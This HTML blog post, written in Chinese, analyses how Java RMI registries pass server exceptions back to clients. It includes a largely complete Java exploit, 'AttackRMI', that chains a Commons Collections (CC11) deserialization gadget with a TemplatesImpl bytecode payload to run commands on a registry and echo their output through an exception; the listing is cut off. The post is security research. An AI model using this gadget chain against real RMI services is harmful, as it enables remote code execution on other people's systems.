@@ -1,0 +1,686 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/null">
+  <link rel="icon" href="/null">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="未尽">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="分析构造RMI 客户端向服务端发起请求查询某个绑定的对象并调用其方法时，方法是在服务端执行然后将结果返回给客户端的，如果服务端执行的过程中出错，那么报错信息也会返回给客户端，所以利用返回报错信息的特点，将命令执行的结果通过报错信息返回，达到回显的目的 先看一个正常的，将一个对象绑定到 server 端，对其进行查询调用，这里对服务端进行 debug 发送给服务端的序列化数据，会在sun.rmi.r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI 回显构造">
+<meta property="og:url" content="http://www.weijin.ink/2023/09/04/RMI-%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:site_name" content="未尽的博客">
+<meta property="og:description" content="分析构造RMI 客户端向服务端发起请求查询某个绑定的对象并调用其方法时，方法是在服务端执行然后将结果返回给客户端的，如果服务端执行的过程中出错，那么报错信息也会返回给客户端，所以利用返回报错信息的特点，将命令执行的结果通过报错信息返回，达到回显的目的 先看一个正常的，将一个对象绑定到 server 端，对其进行查询调用，这里对服务端进行 debug 发送给服务端的序列化数据，会在sun.rmi.r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667863853-d31debe8-71e5-4f25-b6c2-8e558f5521da.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667902499-8689e467-3a2f-4ec6-8d1c-b8436440d3ee.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668022104-3c5fd138-b442-4a00-b08e-dfa380ddc38a.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668424004-5d93ae24-a1d4-497d-a58c-156e6eeb9f68.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668464333-d0d16cc3-7a5b-4df4-abce-5cfb0ca4761f.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668539097-546d5b02-6e49-4058-b53a-b24cd7395da7.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673499084-8ca36d23-b0bb-4375-891b-110ffd05df5c.png">
+<meta property="og:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673734215-4f0ddbea-756b-4863-b498-eb627a266e46.png">
+<meta property="article:published_time" content="2023-09-04T13:41:45.000Z">
+<meta property="article:modified_time" content="2023-09-04T13:57:31.304Z">
+<meta property="article:author" content="未尽">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667863853-d31debe8-71e5-4f25-b6c2-8e558f5521da.png">
+  
+  
+  
+  <title>RMI 回显构造 - 未尽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.weijin.ink","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>未尽</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RMI 回显构造"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-04 21:41" pubdate>
+          2023年9月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          59 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">RMI 回显构造</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="分析构造"><a href="#分析构造" class="headerlink" title="分析构造"></a>分析构造</h1><p>RMI 客户端向服务端发起请求查询某个绑定的对象并调用其方法时，方法是在服务端执行然后将结果返回给客户端的，如果服务端执行的过程中出错，那么报错信息也会返回给客户端，所以利用返回报错信息的特点，将命令执行的结果通过报错信息返回，达到回显的目的</p>
+<p>先看一个正常的，将一个对象绑定到 server 端，对其进行查询调用，这里对服务端进行 debug</p>
+<p>发送给服务端的序列化数据，会在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>方法中进行反序列化，不过 8u141 之前无法在该方法中下断点，可在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中下断点，因为在<code>RegistryImpl_Skel#dispatch</code>反序列化后，会调用<code>RegistryImpl</code>类中的相关方法（bind、rebind 也是同理）</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667863853-d31debe8-71e5-4f25-b6c2-8e558f5521da.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693667902499-8689e467-3a2f-4ec6-8d1c-b8436440d3ee.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>成功查询到对象，然后返回给客户端</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668022104-3c5fd138-b442-4a00-b08e-dfa380ddc38a.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>客户端再远程调用该对象的方法，在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法中通过反射调用</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668424004-5d93ae24-a1d4-497d-a58c-156e6eeb9f68.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>在<code>sun.rmi.server.UnicastRef#marshalValue</code>方法中将结果写入</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668464333-d0d16cc3-7a5b-4df4-abce-5cfb0ca4761f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法的最后将结果返回给客户端</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693668539097-546d5b02-6e49-4058-b53a-b24cd7395da7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>那么如果服务端在反序列化客户端发来的数据时，报错了会怎样，那么报错的信息依然会发送给客户端，在客户端查找一个注册表中不存在的名称</p>
+<p>在<code>sun.rmi.registry.RegistryImpl#lookup</code>方法中会抛出异常</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673499084-8ca36d23-b0bb-4375-891b-110ffd05df5c.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>这个异常会在<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>方法中被捕获，然后返回给客户端</p>
+<p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1693673734215-4f0ddbea-756b-4863-b498-eb627a266e46.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lookup:</span><span class="hljs-number">166</span>, RegistryImpl (sun.rmi.registry)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">-1</span>, RegistryImpl_Skel (sun.rmi.registry)<br><span class="hljs-symbol">oldDispatch:</span><span class="hljs-number">410</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">268</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">run:</span><span class="hljs-number">178</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">run:</span><span class="hljs-number">175</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">doPrivileged:</span><span class="hljs-number">-1</span>, AccessController (java.security)<br><span class="hljs-symbol">serviceCall:</span><span class="hljs-number">174</span>, Transport (sun.rmi.transport)<br><span class="hljs-symbol">handleMessages:</span><span class="hljs-number">557</span>, TCPTransport (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run0:</span><span class="hljs-number">812</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run:</span><span class="hljs-number">671</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">runWorker:</span><span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-number">$Worker</span> (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure>
+
+<p>通过构造恶意的反序列化链，将命令执行的结果放在异常中并抛出，这里使用 CC11</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;dddd&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Process proc = Runtime.getRuntime().exec(\&quot;hostname\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));&quot;</span> +<br>                <span class="hljs-string">&quot;        StringBuffer sb = new StringBuffer();&quot;</span> +<br>                <span class="hljs-string">&quot;        String line;&quot;</span> +<br>                <span class="hljs-string">&quot;        while ((line = br.readLine()) != null)&quot;</span> +<br>                <span class="hljs-string">&quot;        &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;        String result = \&quot;result: \&quot; + sb.toString();&quot;</span> +<br>                <span class="hljs-string">&quot;throw new java.lang.InstantiationException(result);&quot;</span>;<br>        <br>        cc.makeClassInitializer().insertAfter(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rce&quot;</span> + System.nanoTime();<br>        cc.setName(randomName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        classBytes[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>        classBytes[<span class="hljs-number">7</span>] = <span class="hljs-number">50</span>;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">impl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(impl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;testTemplatesImpl&quot;</span>);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innermap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map, impl);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashset_map</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;map&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;backingMap&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        Object[] array = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;table&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;elementData&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, tiedmap);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> createMap(<span class="hljs-string">&quot;asdffq&quot;</span>, hashset);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(<br>                Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler));<br>        <span class="hljs-keyword">try</span> &#123;<br>            registry.bind(<span class="hljs-string">&quot;cmd&quot;</span>, remote);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(sw);<br><br>            <span class="hljs-comment">// 将错误信息输出到 PrintWriter 对象中</span><br>            e.printStackTrace(pw);<br><br>            <span class="hljs-comment">// 将错误堆栈信息转换为字符串</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">stackTrace</span> <span class="hljs-operator">=</span> sw.toString();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">indexString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Caused by: java.lang.InstantiationException: result: &quot;</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> stackTrace.indexOf(indexString);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> stackTrace.lastIndexOf(<span class="hljs-string">&quot;at&quot;</span>);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">exceptionDetails</span> <span class="hljs-operator">=</span> stackTrace.substring(index + indexString.length(), end);<br><br>            System.out.println(exceptionDetails);<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldname, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldname);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span 